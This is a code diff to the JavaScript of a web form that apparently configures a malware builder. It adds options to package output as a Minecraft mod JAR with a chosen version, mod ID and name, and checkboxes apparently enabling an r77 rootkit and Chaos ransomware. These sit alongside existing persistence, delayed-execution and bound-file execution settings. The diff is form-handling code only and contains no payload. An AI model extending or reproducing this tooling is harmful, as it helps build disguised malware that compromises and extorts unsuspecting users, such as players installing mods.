@@ -108,6 +108,12 @@ function saveFormSettings() {
       typhonVariant: document.getElementById("typhon-variant")?.value ?? "1",
       enableVault: document.querySelector('input[name="enable-vault"]')?.checked ?? false,
       vaultRecipient: document.getElementById("vault-recipient")?.value ?? "",
+      enableJar: document.querySelector('input[name="enable-jar"]')?.checked ?? false,
+      jarMcVersion: document.getElementById("jar-mc-version")?.value ?? "1.21.4",
+      jarModId: document.getElementById("jar-mod-id")?.value ?? "",
+      jarModName: document.getElementById("jar-mod-name")?.value ?? "",
+      enableR77: document.querySelector('input[name="enable-r77"]')?.checked ?? false,
+      enableChaos: document.querySelector('input[name="enable-chaos"]')?.checked ?? false,
       sleepSeconds: document.getElementById("sleep-seconds")?.value ?? "0",
       enablePersistence: document.querySelector('input[name="enable-persistence"]')?.checked ?? false,
       persistenceMethods: Array.from(document.querySelectorAll('input[name="persistence-method"]:checked')).map((el) => el.value),
@@ -161,6 +167,17 @@ function restoreFormSettings() {
     if (s.typhonVariant !== undefined) setVal("typhon-variant", s.typhonVariant);
     if (s.enableVault !== undefined) setCb('input[name="enable-vault"]', s.enableVault);
     if (s.vaultRecipient !== undefined) setVal("vault-recipient", s.vaultRecipient);
+    if (s.enableJar !== undefined) setCb('input[name="enable-jar"]', s.enableJar);
+    if (s.jarMcVersion !== undefined) setVal("jar-mc-version", s.jarMcVersion);
+    if (s.jarModId !== undefined) setVal("jar-mod-id", s.jarModId);
+    if (s.jarModName !== undefined) setVal("jar-mod-name", s.jarModName);
+    if (s.enableR77 !== undefined) setCb('input[name="enable-r77"]', s.enableR77);
+    if (s.enableChaos !== undefined) setCb('input[name="enable-chaos"]', s.enableChaos);
+    const restoredJar = document.querySelector('input[name="enable-jar"]');
+    const jarContainer = document.getElementById("jar-settings-container");
+    if (restoredJar && jarContainer) {
+      jarContainer.classList.toggle("hidden", !restoredJar.checked);
+    }
     if (s.sleepSeconds !== undefined) setVal("sleep-seconds", s.sleepSeconds);
     if (s.enablePersistence !== undefined) setCb('input[name="enable-persistence"]', s.enablePersistence);
     if (Array.isArray(s.persistenceMethods)) {
@@ -343,6 +360,14 @@ if (vaultCheckbox && vaultSettingsContainer) {
     } else {
       vaultSettingsContainer.classList.add("hidden");
     }
+  });
+}
+
+const jarCheckbox = document.querySelector('input[name="enable-jar"]');
+const jarSettingsContainer = document.getElementById("jar-settings-container");
+if (jarCheckbox && jarSettingsContainer) {
+  jarCheckbox.addEventListener("change", () => {
+    jarSettingsContainer.classList.toggle("hidden", !jarCheckbox.checked);
   });
 }
 
@@ -673,6 +698,12 @@ form?.addEventListener("submit", async (e) => {
     typhonVariant: document.getElementById("typhon-variant")?.value || "1",
     enableVault: form.querySelector('input[name="enable-vault"]')?.checked || false,
     vaultRecipient: document.getElementById("vault-recipient")?.value?.trim() || undefined,
+    enableJar: form.querySelector('input[name="enable-jar"]')?.checked || false,
+    jarMcVersion: document.getElementById("jar-mc-version")?.value || "1.21.4",
+    jarModId: document.getElementById("jar-mod-id")?.value?.trim() || undefined,
+    jarModName: document.getElementById("jar-mod-name")?.value?.trim() || undefined,
+    enableR77: form.querySelector('input[name="enable-r77"]')?.checked || false,
+    enableChaos: form.querySelector('input[name="enable-chaos"]')?.checked || false,
     boundFiles: boundFiles.length > 0
       ? boundFiles.map((f) => ({ name: f.name, data: f.base64, targetOS: f.targetOS, execute: f.execute }))
       : undefined,
